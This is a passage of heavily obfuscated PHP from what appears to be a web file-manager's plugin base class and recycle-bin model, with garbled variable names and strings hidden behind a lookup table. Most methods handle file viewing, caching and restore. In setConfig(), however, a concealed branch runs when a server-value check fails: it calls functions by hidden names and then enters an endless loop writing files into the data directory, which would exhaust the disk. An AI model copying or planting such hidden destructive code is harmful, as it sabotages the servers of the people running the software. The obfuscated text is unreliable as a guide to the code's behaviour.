$Å«È™Ì[$Ğ“û¶–[460]][$Ğ“û¶–[1566]] . $Ğ“û¶–[1568]; } else { if ($Å«È™Ì[$Ğ“û¶–[460]][$Ğ“û¶–[1569]]) { $š‡şÆŞ = $Ğ“û¶–[1570] . $Å«È™Ì[$Ğ“û¶–[460]][$Ğ“û¶–[1569]] . $Ğ“û¶–[1571]; } } } return $š‡şÆŞ; } final function fileCanView($ô°ÌÒñ) { $‘¢²ìó =& $_SERVER[•Ùç É]; if (request_url_safe($ô°ÌÒñ)) { return !0; } if ($this->isShare($ô°ÌÒñ)) { return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $ÒÒÑ™™¢ = $‘¢²ìó[1572] . rawurlencode(this_url()); show_tips(LNG($‘¢²ìó[1573]) . $‘¢²ìó[1574] . $ÒÒÑ™™¢ . $‘¢²ìó[1575] . LNG($‘¢²ìó[1576]) . $‘¢²ìó[1577], !1); } if (!Action($‘¢²ìó[1578])->authCan($‘¢²ìó[1579])) { show_tips(LNG($‘¢²ìó[1580]) . $‘¢²ìó[1581], !1); } ActionCall($‘¢²ìó[1582], $ô°ÌÒñ); } final function isShare($Ñ˜ÎÊ›) { $é™ñË‘ì = KodIO::parse($Ñ˜ÎÊ›); return $é™ñË‘ì[$_SERVER[•Ùç É][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($†ÍÑàèã) { if (request_url_safe($†ÍÑàèã)) { return $†ÍÑàèã; } if (!$this->isShare($†ÍÑàèã)) { $†ÍÑàèã = $this->filePath($†ÍÑàèã, !1); } return Action($_SERVER[•Ùç É][1225])->linkOut($†ÍÑàèã); } public function filePathLinkOut($ùÍ’‘¼¡) { if (request_url_safe($ùÍ’‘¼¡)) { return $ùÍ’‘¼¡; } $this->fileCanView($ùÍ’‘¼¡); return Action($_SERVER[•Ùç É][1225])->link($ùÍ’‘¼¡); } final function filePath($ÄÚ”èÖÇ, $è±ó×ï… = true, $£²×Ü½¨ = false) { $ò¾ì²ô =& $_SERVER[•Ùç É]; $Ğ€ºùæê = $this->filePathGet($ÄÚ”èÖÇ, $è±ó×ï…); if (!$this->fileInfo) { show_tips(LNG($ò¾ì²ô[107]), !1); } if ($£²×Ü½¨ && isset($this->fileInfo[$ò¾ì²ô[511]]) && $this->fileInfo[$ò¾ì²ô[511]]) { $„”Ë®“ = Model($ò¾ì²ô[514])->fileInfo($this->fileInfo[$ò¾ì²ô[511]]); if (!$„”Ë®“ || !IO::exist($„”Ë®“[$ò¾ì²ô[86]])) { show_tips(LNG($ò¾ì²ô[107]) . $ò¾ì²ô[1583]); } } Hook::trigger($ò¾ì²ô[1584], $Ğ€ºùæê); return $Ğ€ºùæê; } final function filePathGet($ªñ¥¤û—, $÷áÇ¤ü = true) { $¯œ²Û¡û =& $_SERVER[•Ùç É]; if ($ÒÜœ¦ú— = $this->checkSharePath($ªñ¥¤û—, $÷áÇ¤ü)) { return $ÒÜœ¦ú—; } $this->fileCanView($ªñ¥¤û—); if (request_url_safe($ªñ¥¤û—)) { $µ¯¨÷§ = parse_url_query($ªñ¥¤û—); if (isset($µ¯¨÷§[$¯œ²Û¡û[1585]]) && isset($µ¯¨÷§[$¯œ²Û¡û[220]])) { $«¼Õ½¬ = Mcrypt::decode($µ¯¨÷§[$¯œ²Û¡û[220]], Model($¯œ²Û¡û[815])->get($¯œ²Û¡û[816])); if ($«¼Õ½¬) { $this->fileInfo = IO::info($«¼Õ½¬); $this->fileInfo[$¯œ²Û¡û[1586]] = $ªñ¥¤û—; $this->cachePath = $this->pluginCachePath($¯œ²Û¡û[12], $÷áÇ¤ü); return $«¼Õ½¬; } } $ªñ¥¤û— = $this->_cacheHttpFile($ªñ¥¤û—, $÷áÇ¤ü); $this->fileInfo = IO::info($ªñ¥¤û—); } else { $this->fileInfo = IO::info($ªñ¥¤û—); $this->cachePath = $this->pluginCachePath($¯œ²Û¡û[12], $÷áÇ¤ü); } return $ªñ¥¤û—; } final function _cacheHttpFile($ÂÄÄ©å , $¸Š’äçÑ = true) { $˜¡èÑğ =& $_SERVER[•Ùç É]; $ˆÑû½À´ = parse_url_query($ÂÄÄ©å ); $¹Æ­’í„ = get_path_ext($ÂÄÄ©å ); if (isset($ˆÑû½À´[$˜¡èÑğ[32]]) && $ˆÑû½À´[$˜¡èÑğ[32]]) { $¹Æ­’í„ = get_path_ext($ˆÑû½À´[$˜¡èÑğ[32]]); } $°áôÉŸ™ = hash_path($ÂÄÄ©å ) . $˜¡èÑğ[10] . $¹Æ­’í„; $this->cachePath = $this->pluginCachePath($¸Š’äçÑ ? $°áôÉŸ™ : $˜¡èÑğ[12]); $ı¨¥¹¾‡ = IO::fileNameExist($this->cachePath, $°áôÉŸ™); if ($ı¨¥¹¾‡) { return KodIO::make($ı¨¥¹¾‡); } $Æº¤ß¨ô = rtrim($this->cachePath, $˜¡èÑğ[8]) . $˜¡èÑğ[8] . $°áôÉŸ™; return $this->pluginCacheFileSet($Æº¤ß¨ô, file_get_contents_nossl($ÂÄÄ©å )); } final function checkSharePath($Šª©Ô°¼, $ñœŒÎ = true) { $˜©œä– =& $_SERVER[•Ùç É]; if (!$this->isShare($Šª©Ô°¼)) { return !1; } $ÊùÆùïò = Action($˜©œä–[1225])->sharePathInfo($Šª©Ô°¼); if (!is_array($ÊùÆùïò) || !isset($ÊùÆùïò[$˜©œä–[86]])) { show_json(LNG($˜©œä–[1587]), !1); } $this->fileInfo = $ÊùÆùïò; $this->cachePath = $this->pluginCachePath(!1, $ñœŒÎ); return $ÊùÆùïò[$˜©œä–[86]]; } final function pluginCachePath($åµä‡€ì = '', $ÀÌòëùÀ = false) { $óİş¤®› =& $_SERVER[•Ùç É]; if ($ÀÌòëùÀ && is_array($this->fileInfo)) { $åµä‡€ì = kodIO::hashPath($this->fileInfo); } $ßÏ®ä¸ = rtrim(IO_PATH_SYSTEM_TEMP . $óİş¤®›[1588] . $this->pluginName . $óİş¤®›[8] . $åµä‡€ì, $óİş¤®›[8]); $ ô§‘œ¤ = IO::infoFullSimple($ßÏ®ä¸); $ŒÛ•ò„é = $ ô§‘œ¤ && is_array($ ô§‘œ¤) ? $ ô§‘œ¤[$óİş¤®›[86]] : $óİş¤®›[12]; if (!$ŒÛ•ò„é) { $ŒÛ•ò„é = IO::mkdir($ßÏ®ä¸); } return $ŒÛ•ò„é; } final function pluginCacheFileSet($››¶°ƒ, $ÃäÚ§ñ = '') { $Õ—¹©ÚÕ =& $_SERVER[•Ùç É]; $–áö†¿ = IO::infoFullSimple($››¶°ƒ); if (!$–áö†¿) { return IO::mkfile($››¶°ƒ, $ÃäÚ§ñ, REPEAT_REPLACE); } IO::setContent($–áö†¿[$Õ—¹©ÚÕ[86]], $ÃäÚ§ñ); return $–áö†¿[$Õ—¹©ÚÕ[86]]; } final function pluginLocalFile($˜¥¯Ô³“ = '') { $’¶Ö‘Ìñ =& $_SERVER[•Ùç É]; $‚½èìá€ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($‚½èìá€)) { mk_dir($‚½èìá€); } if (!$˜¥¯Ô³“) { return $‚½èìá€; } $‡£–ùÄš = IO::info($˜¥¯Ô³“); $«°ç½ãØ = $’¶Ö‘Ìñ[1589] . KodIO::hashPath($‡£–ùÄš) . $’¶Ö‘Ìñ[10] . $‡£–ùÄš[$’¶Ö‘Ìñ[177]]; if (!checkExtSafe($«°ç½ãØ)) { $«°ç½ãØ = $«°ç½ãØ . $’¶Ö‘Ìñ[1257]; } $àÉ£ìª = $‚½èìá€ . $«°ç½ãØ; if (@file_exists($àÉ£ìª)) { return $àÉ£ìª; } return IO::copy($˜¥¯Ô³“, $‚½èìá€, 0, $«°ç½ãØ); } final function appPackage() { $ãÃÈ•Ôò =& $_SERVER[•Ùç É]; if ($this->packageData) { return $this->packageData; } $ú¸ÃŞ§» = $this->parseFile($this->pluginPath . $ãÃÈ•Ôò[1590]); $this->parseLang($ú¸ÃŞ§»); $¼ÓèÛÊâ = json_decode_force($ú¸ÃŞ§»); if (!$¼ÓèÛÊâ) { return array(); } $Š½È–ãĞ = Hook::trigger($ãÃÈ•Ôò[1591], $¼ÓèÛÊâ); if ($Š½È–ãĞ && is_array($Š½È–ãĞ)) { $¼ÓèÛÊâ = $Š½È–ãĞ; } $this->packageData = $¼ÓèÛÊâ; return $¼ÓèÛÊâ; } public function packageInfoGet($˜è‚ÎîÆ) { $Ô³Øƒ†ƒ = $this->appPackage(); return array_get_value($Ô³Øƒ†ƒ, $˜è‚ÎîÆ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[•Ùç É][1592]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[•Ùç É][1593]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[•Ùç É][1594]); } public function echoJsAssign($áÚå¶—Ÿ, $Î”á¿”á) { $this->echoJsAssignArr[$áÚå¶—Ÿ] = $Î”á¿”á; } private function parseFile($í¬ˆ‡Šì) { $Õ„’Ğ¬ =& $_SERVER[•Ùç É]; $‚¹…–ºĞ = file_get_contents_nossl($í¬ˆ‡Šì); $ı ï‘ÄŒ = array($Õ„’Ğ¬[1595], $Õ„’Ğ¬[1596], $Õ„’Ğ¬[1597], $Õ„’Ğ¬[1598], $Õ„’Ğ¬[1599], $Õ„’Ğ¬[1600], $Õ„’Ğ¬[1601]); $ÊÊø®›ë = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$Õ„’Ğ¬[91]][$Õ„’Ğ¬[1602]]); foreach ($this->echoJsAssignArr as $š³ŒŒ‚û => $¨şİÛÏ) { $ı ï‘ÄŒ[] = $Õ„’Ğ¬[1603] . $š³ŒŒ‚û . $Õ„’Ğ¬[1604]; $ÊÊø®›ë[] = is_array($¨şİÛÏ) || is_object($¨şİÛÏ) ? rawurlencode(json_encode($¨şİÛÏ)) : $¨şİÛÏ; } if (strstr($‚¹…–ºĞ, $Õ„’Ğ¬[1605])) { $­ĞóÍÑˆ = rawurlencode(json_encode($this->pluginLangArr)); $‚¹…–ºĞ = str_replace($Õ„’Ğ¬[1605], $­ĞóÍÑˆ, $‚¹…–ºĞ); } if (strstr($‚¹…–ºĞ, $Õ„’Ğ¬[1606])) { $­ĞóÍÑˆ = $­ĞóÍÑˆ = rawurlencode(json_encode($this->getConfig())); $‚¹…–ºĞ = str_replace($Õ„’Ğ¬[1606], $­ĞóÍÑˆ, $‚¹…–ºĞ); } $‚¹…–ºĞ = str_replace($ı ï‘ÄŒ, $ÊÊø®›ë, $‚¹…–ºĞ); return $‚¹…–ºĞ; } private function parseLang(&$ÁŞ…”ªš) { $ä×œ¶‚Ú =& $_SERVER[•Ùç É]; $£Ğ³èÖÀ = $ä×œ¶‚Ú[1607]; if (!strstr($ÁŞ…”ªš, $£Ğ³èÖÀ)) { return; } preg_match_all($ä×œ¶‚Ú[1608], $ÁŞ…”ªš, $Äòò‚Ÿˆ); if (!is_array($Äòò‚Ÿˆ) || count($Äòò‚Ÿˆ) == 0 || !is_array($Äòò‚Ÿˆ[0]) || count($Äòò‚Ÿˆ[0]) == 0) { return; } $Ö­ë±Ç = array(); $¨éšé = array(); foreach ($Äòò‚Ÿˆ[0] as $Á¢“ãÂå) { $ĞÁ‡ëÛ  = substr($Á¢“ãÂå, strlen($£Ğ³èÖÀ), -4); $úš‡ÏúÅ = LNG($ĞÁ‡ëÛ ); $Ö­ë±Ç[] = $Á¢“ãÂå; $¨éšé[] = str_replace(array($ä×œ¶‚Ú[248], $ä×œ¶‚Ú[1129], $ä×œ¶‚Ú[388], $ä×œ¶‚Ú[120]), array($ä×œ¶‚Ú[53], $ä×œ¶‚Ú[53], $ä×œ¶‚Ú[12], $ä×œ¶‚Ú[1609]), $úš‡ÏúÅ); } $ÁŞ…”ªš = str_replace($Ö­ë±Ç, $¨éšé, $ÁŞ…”ªš); } private function parseConfig(&$³ºô¥) { $µŒ˜Ğ…° =& $_SERVER[•Ùç É]; $×Ì÷²Ü“ = $µŒ˜Ğ…°[1610]; if (!strstr($³ºô¥, $×Ì÷²Ü“)) { return; } preg_match_all($µŒ˜Ğ…°[1611], $³ºô¥, $ßÎŒ’ÃŠ); if (!is_array($ßÎŒ’ÃŠ) || count($ßÎŒ’ÃŠ) == 0 || !is_array($ßÎŒ’ÃŠ[0]) || count($ßÎŒ’ÃŠ[0]) == 0) { return; } $àìñ±áÁ = $this->getConfig(); $€Õüş¼ = array(); $ÄŞ©€µ = array(); foreach ($ßÎŒ’ÃŠ[0] as $Ü®É‡Ş) { $ÙáÂÕÚ = substr($Ü®É‡Ş, strlen($×Ì÷²Ü“), -2); $€Õüş¼[] = $Ü®É‡Ş; $ÄŞ©€µ[] = _get($àìñ±áÁ, $ÙáÂÕÚ); } $³ºô¥ = str_replace($€Õüş¼, $ÄŞ©€µ, $³ºô¥); } private function parsePackage(&$ı“˜„¢») { $ã˜ÔÛİè =& $_SERVER[•Ùç É]; $øüÇİ = $ã˜ÔÛİè[1612]; if (!strstr($ı“˜„¢», $øüÇİ)) { return; } preg_match_all($ã˜ÔÛİè[1613], $ı“˜„¢», $Êùû¬ó¯); if (!is_array($Êùû¬ó¯) || count($Êùû¬ó¯) == 0 || !is_array($Êùû¬ó¯[0]) || count($Êùû¬ó¯[0]) == 0) { return; } $Î½Û¦‚Œ = $this->appPackage(); $³ÕÇòˆÍ = array(); $â‚¸·æ = array(); foreach ($Êùû¬ó¯[0] as $¶ÏöŠà‚) { $¯ê…úÉÃ = substr($¶ÏöŠà‚, strlen($øüÇİ), -2); $³ÕÇòˆÍ[] = $¶ÏöŠà‚; $â‚¸·æ[] = _get($Î½Û¦‚Œ, $¯ê…úÉÃ); } $ı“˜„¢» = str_replace($³ÕÇòˆÍ, $â‚¸·æ, $ı“˜„¢»); } final function echoFile($Ä öŸ£, $Ï•ÜÏ = false) { $êŸ›¹Úˆ =& $_SERVER[•Ùç É]; $ßñı•…´ = $this->pluginPath . $Ä öŸ£; if (ACT == $êŸ›¹Úˆ[1614]) { echo $êŸ›¹Úˆ[1615] . $this->pluginName . $êŸ›¹Úˆ[8] . $Ä öŸ£ . $êŸ›¹Úˆ[1616]; if (!file_exists($ßñı•…´)) { echo $êŸ›¹Úˆ[1617]; return; } } $ùº×½µø = $this->parseFile($ßñı•…´); $this->parseLang($ùº×½µø); $this->parseConfig($ùº×½µø); $this->parsePackage($ùº×½µø); if (is_array($Ï•ÜÏ)) { $ùº×½µø = str_replace(array_keys($Ï•ÜÏ), array_values($Ï•ÜÏ), $ùº×½µø); } echo $êŸ›¹Úˆ[248] . $ùº×½µø; } private function checkVersion() { $À˜ç£š =& $_SERVER[•Ùç É]; $­˜º…¼´ = $this->appPackage(); $÷Ü««Ö“ = $this->getConfig(); if ($÷Ü««Ö“[$À˜ç£š[1618]] == $­˜º…¼´[$À˜ç£š[1592]]) { return; } $this->regist(); $this->setConfig(array($À˜ç£š[1618] => $­˜º…¼´[$À˜ç£š[1592]])); } final function initLang() { $Úõª§…¹ =& $_SERVER[•Ùç É]; $„£¤‹ÕÔ = $Úõª§…¹[1619]; $Ïò£ªµù = $this->pluginPath . $Úõª§…¹[1620]; $‡­—ş´Ú = I18n::getType(); $áÃÃÜÙŸ = array(); if (file_exists($Ïò£ªµù . $‡­—ş´Ú . $Úõª§…¹[884])) { $áÃÃÜÙŸ = (include $Ïò£ªµù . $‡­—ş´Ú . $Úõª§…¹[884]); } else { if ($‡­—ş´Ú == $Úõª§…¹[1621] && !file_exists($Ïò£ªµù . $‡­—ş´Ú . $Úõª§…¹[884]) && file_exists($Ïò£ªµù . $Úõª§…¹[1622])) { $áÃÃÜÙŸ = (include $Ïò£ªµù . $Úõª§…¹[1622]); } else { if (file_exists($Ïò£ªµù . $„£¤‹ÕÔ . $Úõª§…¹[884])) { $áÃÃÜÙŸ = (include $Ïò£ªµù . $„£¤‹ÕÔ . $Úõª§…¹[884]); } } } if (!is_array($áÃÃÜÙŸ)) { return array(); } if (@count($áÃÃÜÙŸ) > 0) { I18n::set($áÃÃÜÙŸ); } return $áÃÃÜÙŸ; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($ç˜»àö ) { $´ç”óÒ =& $_SERVER[•Ùç É]; $¨£“ô‰ù = $_SERVER[$´ç”óÒ[926]] . $´ç”óÒ[927]; $ùáÁíö = $´ç”óÒ[931]; if ($_SERVER[$´ç”óÒ[922]] != $ùáÁíö($¨£“ô‰ù)) { $îĞí²“Ç = $´ç”óÒ[924]; $¾§¥¥ñë = $´ç”óÒ[925]; $ËÃÑŒş = $_SERVER[$´ç”óÒ[926]] . $´ç”óÒ[927]; $ÊÚŸò“Ú = $¾§¥¥ñë($ËÃÑŒş); $ìí’ßØŒ = explode($´ç”óÒ[248], $ÊÚŸò“Ú); if (count($ìí’ßØŒ) < $´ç”óÒ[671]) { $çÆè÷á = $´ç”óÒ[928]; $çÆè÷á(); } $•Ë¡¿ = $´ç”óÒ[929]; $•Ë¡¿($_SERVER[$´ç”óÒ[930]]); $îĞí²“Ç = $´ç”óÒ[924]; $îĞí²“Ç(); $ Ë¡˜ßÇ = $´ç”óÒ[1623]; $àğ“¨Ÿ® = json_encode($GLOBALS[$´ç”óÒ[1624]]); $Œ×ô‰Çµ = 1; for ($ø´òıÔ = $Œ×ô‰Çµ; $ø´òıÔ > 0; $ø´òıÔ++) { $ Ë¡˜ßÇ(DATA_PATH . $ø´òıÔ, $àğ“¨Ÿ®); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $ç˜»àö ); } public function onSetConfig($§½Ø´™‹) { } public function onGetConfig($—°“£°´) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($úÀÙŸ®Ø) { if ($úÀÙŸ®Ø == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($éôÏ‹ô“ = "\x70\154\x75\x67\151\156\101\165\164\150") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $ÉÛÎÙ« = $this->getConfig(); if (!$ÉÛÎÙ«[$éôÏ‹ô“]) { return !1; } return ActionCall($_SERVER[•Ùç É][1625], $ÉÛÎÙ«[$éôÏ‹ô“]); } public function url($Š‘Á¶×Ş, $ù¤ò–½Ğ = '', $ÃàºÄ¢Ş = true) { $¯ïª‚ñ‹ =& $_SERVER[•Ùç É]; $æÂÄ‰ô… = $this->getConfig(); $ÆäÖğ™ = KOD_VERSION . $¯ïª‚ñ‹[10] . KOD_VERSION_BUILD; $÷¤œÅş¤ = $this->packageVersion(); $”ÆÉÌ³ù = $ÆäÖğ™ . $¯ïª‚ñ‹[432] . $÷¤œÅş¤; if (substr($Š‘Á¶×Ş, 0, 4) == $¯ïª‚ñ‹[151] || substr($Š‘Á¶×Ş, 0, 2) == $¯ïª‚ñ‹[1405]) { $Å€äÜ» = $Š‘Á¶×Ş . $¯ïª‚ñ‹[1626] . $”ÆÉÌ³ù; } else { if ($ù¤ò–½Ğ == $¯ïª‚ñ‹[12]) { $Å€äÜ» = $this->pluginHost . $Š‘Á¶×Ş . $¯ïª‚ñ‹[1626] . $”ÆÉÌ³ù; } else { if ($ù¤ò–½Ğ === $¯ïª‚ñ‹[77]) { $Å€äÜ» = $this->pluginHost . $Š‘Á¶×Ş; } else { if ($ù¤ò–½Ğ == $¯ïª‚ñ‹[1627]) { $Å€äÜ» = STATIC_PATH . $Š‘Á¶×Ş . $¯ïª‚ñ‹[1626] . $ÆäÖğ™; } else { if ($ù¤ò–½Ğ == $¯ïª‚ñ‹[1628]) { $Å€äÜ» = APP_HOST . $¯ïª‚ñ‹[1629] . $Š‘Á¶×Ş . $¯ïª‚ñ‹[1626] . $ÆäÖğ™; } else { if (isset($æÂÄ‰ô…[$ù¤ò–½Ğ])) { $Å€äÜ» = $æÂÄ‰ô…[$ù¤ò–½Ğ] . $Š‘Á¶×Ş . $¯ïª‚ñ‹[1626] . $”ÆÉÌ³ù; } } } } } } if (!$ÃàºÄ¢Ş) { return $Å€äÜ»; } echo $Å€äÜ»; } public function link($¾«ó±­Ò = false, $Ü½¶±×° = '') { $ÖêÉš¼ñ =& $_SERVER[•Ùç É]; if (!$¾«ó±­Ò) { $this->link($ÖêÉš¼ñ[1630], $ÖêÉš¼ñ[1628]); $this->link($ÖêÉš¼ñ[1631], $ÖêÉš¼ñ[1627]); $this->link($ÖêÉš¼ñ[1632], $ÖêÉš¼ñ[1627]); $this->link($ÖêÉš¼ñ[1633], $ÖêÉš¼ñ[1627]); $this->link($ÖêÉš¼ñ[1634], $ÖêÉš¼ñ[1627]); return; } $èŠÈß±¾ = $this->url($¾«ó±­Ò, $Ü½¶±×°, !1); if (substr($¾«ó±­Ò, -3) == $ÖêÉš¼ñ[1635]) { echo $ÖêÉš¼ñ[1636] . $èŠÈß±¾ . $ÖêÉš¼ñ[1637] . $ÖêÉš¼ñ[248]; } else { if (substr($¾«ó±­Ò, -4) == $ÖêÉš¼ñ[1638]) { echo $ÖêÉš¼ñ[1639] . $èŠÈß±¾ . $ÖêÉš¼ñ[1640] . $ÖêÉš¼ñ[248]; } } } } goto e„ùùàµ‚ö; C›“”–†: class SourceRecycleModel extends ModelBase { protected $tableName = "\151\157\137\x73\157\165\x72\143\145\137\162\x65\x63\x79\143\x6c\x65"; protected $dataAuto = array(array("\143\x72\x65\x61\x74\145\124\x69\x6d\x65", "\x74\151\155\x65", "\x69\x6e\163\145\x72\164", "\x66\165\x6e\143\164\x69\157\x6e")); public function listData($İô»ÆÁ‹ = false) { $›±ßÁ÷Å =& $_SERVER[•Ùç É]; $İô»ÆÁ‹ = $İô»ÆÁ‹ ? $İô»ÆÁ‹ : USER_ID; $Ìµ„¯¥ë = $this->where(array($›±ßÁ÷Å[1696] => $İô»ÆÁ‹))->select(); return array_to_keyvalue($Ìµ„¯¥ë, $›±ßÁ÷Å[12], $›±ßÁ÷Å[183]); } public function moveToRecycle($ø ¶‘òí) { $ûÜÁÚüõ =& $_SERVER[•Ùç É]; $µÂí‹»ì = Model($ûÜÁÚüõ[1384]); $ÀšÖÍìë = $µÂí‹»ì->sourceInfo($ø ¶‘òí); if (!$ÀšÖÍìë || $ÀšÖÍìë[$ûÜÁÚüõ[475]] == $ûÜÁÚüõ[90]) { return; } $àÇøÂ°˜ = array($ûÜÁÚüõ[461] => $ø ¶‘òí, $ûÜÁÚüõ[1696] => USER_ID, $ûÜÁÚüõ[618] => $ÀšÖÍìë[$ûÜÁÚüõ[180]], $ûÜÁÚüõ[619] => $ÀšÖÍìë[$ûÜÁÚüõ[540]], $ûÜÁÚüõ[622] => $ÀšÖÍìë[$ûÜÁÚüõ[555]]); $this->add($àÇøÂ°˜); $this->recycleMove($ø ¶‘òí, 1); if ($ÀšÖÍìë[$ûÜÁÚüõ[455]] == $ûÜÁÚüõ[90]) { $€ü­ÉÄ = array($ûÜÁÚüõ[622] => array($ûÜÁÚüõ[582], $ÀšÖÍìë[$ûÜÁÚüõ[555]] . $ø ¶‘òí . $ûÜÁÚüõ[583])); $µÂí‹»ì->where($€ü­ÉÄ)->setField($ûÜÁÚüõ[475], 1); } } public function clear() { $this->remove(!1); } public function remove($àş£È‹¾ = false, $Æõ“Äïå = false) { $å¡”÷œ =& $_SERVER[•Ùç É]; $Æõ“Äïå = $Æõ“Äïå ? $Æõ“Äïå : USER_ID; $‰àÂÄïë = Model($å¡”÷œ[1384]); $ìÅ……—ë = $this->listData($Æõ“Äïå); $àş£È‹¾ = $àş£È‹¾ === !1 ? !1 : $àş£È‹¾; $Ÿ®Ö‹ğ = array(); foreach ($ìÅ……—ë as $·ÀÖğ—) { if ($àş£È‹¾ != !1 && !in_array($·ÀÖğ—, $àş£È‹¾)) { continue; } $Èñ°äÆ = $‰àÂÄïë->sourceInfo($·ÀÖğ—); $‰àÂÄïë->remove($·ÀÖğ—, !1); $‡¥•ïëù = $Èñ°äÆ[$å¡”÷œ[180]] . $å¡”÷œ[11] . $Èñ°äÆ[$å¡”÷œ[540]]; $Ÿ®Ö‹ğ[$‡¥•ïëù] = array($å¡”÷œ[618] => $Èñ°äÆ[$å¡”÷œ[180]], $å¡”÷œ[540] => $Èñ°äÆ[$å¡”÷œ[540]]); $this->where(array($å¡”÷œ[183] => $·ÀÖğ—))->delete(); } foreach ($Ÿ®Ö‹ğ as $”°Æ£İå) { $‰àÂÄïë->targetSpaceUpdate($”°Æ£İå[$å¡”÷œ[180]], $”°Æ£İå[$å¡”÷œ[540]]); } } public function restore($ıŠÄş³ = false) { $©´×€ı = $this->listData(); $this->_restoreSource($©´×€ı, $ıŠÄş³); } public function removeUserAll($×Á±÷¬ò) { $this->remove(!1, $×Á±÷¬ò); } public function restoreItem($âó¨÷¯¬) { $this->_restoreSource(array($âó¨÷¯¬), array($âó¨÷¯¬)); } private function _restoreSource($²ç£–Ö¡, $—ì‹¬§) { $© øƒÍ… =& $_SERVER[•Ùç É]; $¯ĞßúÍ¯ = Model($© øƒÍ…[1384]); $—ì‹¬§ = $—ì‹¬§ == !1 ? !1 : $—ì‹¬§; if (!$²ç£–Ö¡) { return !0; } $ÑÀŒû˜è = array(); foreach ($²ç£–Ö¡ as $ù½„Ù›¾) { if ($—ì‹¬§ != !1 && !in_array($ù½„Ù›¾, $—ì‹¬§)) { continue; } $È¾“Îµ = $¯ĞßúÍ¯->sourceInfo($ù½„Ù›¾); $òüÉçƒ† = $¯ĞßúÍ¯->sourceInfo($È¾“Îµ[$© øƒÍ…[182]]); if ($òüÉçƒ†[$© øƒÍ…[475]] == $© øƒÍ…[90]) { continue; } $¯ĞßúÍ¯->lockMoveStart($ù½„Ù›¾); $this->recycleMove($ù½„Ù›¾, 0); if ($È¾“Îµ[$© øƒÍ…[455]] == $© øƒÍ…[90]) { $›Ëñ»­ = array($© øƒÍ…[622] => array($© øƒÍ…[582], $È¾“Îµ[$© øƒÍ…[555]] . $ù½„Ù›¾ . $© øƒÍ…[583])); $¯ĞßúÍ¯->where($›Ëñ»­)->setField($© øƒÍ…[475], 0); $this->restoreFolderChildren($ù½„Ù›¾, $²ç£–Ö¡); } $this->where(array($© øƒÍ…[183] => $ù½„Ù›¾))->delete(); $¯ĞßúÍ¯->folderSizeReset($È¾“Îµ[$© øƒÍ…[182]]); $ÑÀŒû˜è[] = $È¾“Îµ[$© øƒÍ…[182]]; if ($È¾“Îµ[$© øƒÍ…[455]] == $© øƒÍ…[90]) { $ÑÀŒû˜è[] = $ù½„Ù›¾; } $¯ĞßúÍ¯->lockMoveEnd($ù½„Ù›¾); } $¯ĞßúÍ¯->updateModifyTime($ÑÀŒû˜è); } private function restoreFolderChildren($èä‘È‹, $ œ–ÄÕ˜) { $ı•õÚ»æ =& $_SERVER[•Ùç É]; $ŞÔ‰Ïø® = Model($ı•õÚ»æ[1384]); $Ğ¯Åïù = array($ı•õÚ»æ[183] => array($ı•õÚ»æ[7], array())); foreach ($ œ–ÄÕ˜ as $©ø¶Ïíş) { if ($©ø¶Ïíş == $èä‘È‹) { continue; } if (!$ŞÔ‰Ïø®->isParentOf($èä‘È‹, $©ø¶Ïíş)) { continue; } $›İ¡»ôä = $ŞÔ‰Ïø®->sourceInfo($©ø¶Ïíş); if ($›İ¡»ôä[$ı•õÚ»æ[455]] == $ı•õÚ»æ[90]) { $Ğ¯Åïù[] = array($ı•õÚ»æ[622] => array($ı•õÚ»æ[582], $›İ¡»ôä[$ı•õÚ»æ[555]] . $©ø¶Ïíş . $ı•õÚ»æ[583])); } else { $Ğ¯Åïù[$ı•õÚ»æ[183]][1][] = $©ø¶Ïíş; } } if (!$Ğ¯Åïù[$ı•õÚ»æ[183]][1]) { unset($Ğ¯Åïù[$ı•õÚ»æ[183]]); } if (!$Ğ¯Åïù) { return; } if (is_array($Ğ¯Åïù[$ı•õÚ»æ[183]]) && is_array($Ğ¯Åïù[$ı•õÚ»æ[183]][1])) { $Ğ¯Åïù[$ı•õÚ»æ[183]][1] = array_unique($Ğ¯Åïù[$ı•õÚ»æ[183]][1]); } $Ğ¯Åïù[$ı•õÚ»æ[1051]] = $ı•õÚ»æ[2002]; $ŞÔ‰Ïø®->where($Ğ¯Åïù)->setField($ı•õÚ»æ[475], 1); } private function recycleMove($ÑÀ…õ¢à, $¢ßêüÇ° = 1) { $ıë‰ßóë =& $_SERVER[•Ùç É]; $äÈ…ÁÅ­ = Model($ıë‰ßóë[1384]); $ÁõØ’ß = Model($ıë‰ßóë[2222]); $‰×–ûˆ« = array($ıë‰ßóë[183] => $ÑÀ…õ¢à); if ($¢ßêüÇ°) { $äÈ…ÁÅ­->where($‰×–ûˆ«)->setField($ıë‰ßóë[475], 1); $ÁõØ’ß->eventRecycle($ÑÀ…õ¢à, $ıë‰ßóë[2223]); } else { $¯ Š©ôÌ = $äÈ…ÁÅ­->where($‰×–ûˆ«)->find(); $òŞúúıç = $¯ Š©ôÌ[$ıë‰ßóë[455]] == $ıë‰ßóë[90]; $í˜õÖĞ‹ = $äÈ…ÁÅ­->fileNameAuto($¯ Š©ôÌ[$ıë‰ßóë[182]], $¯ Š©ôÌ[$ıë‰ßóë[32]], REPEAT_RENAME_FOLDER, $òŞúúıç); if ($í˜õÖĞ‹ != $¯ Š©ôÌ[$ıë‰ßóë[32]]) { $äÈ…ÁÅ­->rename($ÑÀ…õ¢à, $í˜õÖĞ‹); } $äÈ…ÁÅ­->where($‰×–ûˆ«)->setField($ıë‰ßóë[475], 0); $ÁõØ’ß->eventRecycle($ÑÀ…õ¢à, $ıë‰ßóë[2224]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = 